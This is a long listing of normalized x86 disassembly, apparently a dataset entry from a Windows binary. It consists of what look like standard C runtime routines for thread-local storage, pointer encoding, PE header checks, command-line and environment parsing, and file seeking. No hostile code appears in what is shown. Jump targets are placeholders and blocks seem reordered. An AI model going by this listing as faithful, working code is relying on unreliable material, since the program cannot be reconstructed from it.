push r--data
push edi
mov [ rwxdata ] eax
call esi
cmp [ rwxdata ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rwxdata ] eax
je r-xdata
call sub_412421
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rwxdata ] eax
mov eax [ TlsFree@IAT ]
mov [ rwxdata ] sub_4123a7
mov [ rwxdata ] esi
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
je r-xdata
xor eax eax
push [ rwxdata ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
call sub_40cbb8
push [ rwxdata ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
mov [ rwxdata ] eax
call sub_40f278
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_412421
mov edi [ DecodePointer@IAT ]
push sub_4125a5
push [ rwxdata ]
call edi
call eax
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40ef0a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_41245e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_4128c9
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rwxdata ]
call esi
push [ rwxdata ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_419407
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rwxdata ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ef56
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ef56
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
sub_41297f
mov edi edi
push esi
push 0x4
push 0x20
call sub_40ef0a
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
mov [ rwxdata ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4129b0
push 0xc
push r--data
call sub_40f510
call sub_40cba6
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4128c9
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4129e6
mov eax [ ebp - 0x1c ]
call sub_40f555
retn
sub_412a03
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_412a29
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_412a4f
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rwxdata ]
call [ EncodePointer@IAT ]
mov [ edi + rwxdata ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_412a80
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_412ac0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_412b10
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40f5a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_412a80
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_412ac0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412bcc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_411b5c
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_412c1c
mov eax ecx
push esi
add ecx 0x90
pop esi
cmp eax ecx
jae r-xdata
add eax 0xc
lea esi [ ecx + 0x90 ]
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
retn
sub_412c42
mov edi edi
push ebp
mov ebp esp
push esi
call sub_412512
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_412d8c
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_412c42
pop ecx
pop ecx
pop ebp
retn
sub_412dac
mov edi edi
push esi
push edi
xor edi edi
cmp [ rwxdata ] edi
jne r-xdata
mov esi [ rwxdata ]
test esi esi
jne r-xdata
call sub_413fa7
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_41964f
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_412e0b
cmp [ rwxdata ] 0x0
jne r-xdata
push esi
mov esi [ rwxdata ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_413fa7
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40ef0a
mov edi eax
pop ecx
pop ecx
mov [ rwxdata ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_413290
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rwxdata ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_413290
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rwxdata ]
call sub_40b955
and [ rwxdata ] 0x0
and [ edi ] 0x0
mov [ rwxdata ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40ef0a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rwxdata ]
call sub_40b955
and [ rwxdata ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
int3
add edi 0x4
sub_412ef6
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_41964f
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_41964f
pop ecx
test eax eax
je r-xdata
call sub_41964f
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_413090
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rwxdata ] ebx
jne r-xdata
push 0x104
mov esi rwxdata
push esi
push ebx
mov [ rwxdata ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
cmp eax ebx
je r-xdata
call sub_413fa7
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_412ef6
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40eec5
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_412ef6
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rwxdata ] eax
mov [ rwxdata ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_41314b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40eec5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_40b955
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_4131e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rwxdata ] eax
jmp r-xdata
mov [ rwxdata ] esi
not esi
mov [ rwxdata ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_413290
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41331b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_41239e
and [ ebp - 0x14 ] 0x0
cmp [ rwxdata ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rwxdata ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rwxdata ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rwxdata ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rwxdata ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
mov [ rwxdata ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rwxdata ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov eax [ rwxdata ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_413487
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40e72d
mov eax esi
sub_4134fc
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
sub_4135c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4135e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40e72d
mov eax esi
sub_413647
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rwxdata ]
pop ebp
retn
sub_413695
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_417abe
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_40d220
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_41371a
push 0x14
push r--data
call sub_40f510
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40f555
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413695
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4137fa
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_413804
mov edi edi
push ebp
mov ebp esp
inc [ rwxdata ]
push 0x1000
call sub_40eec5
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_41384d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_4138a3
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
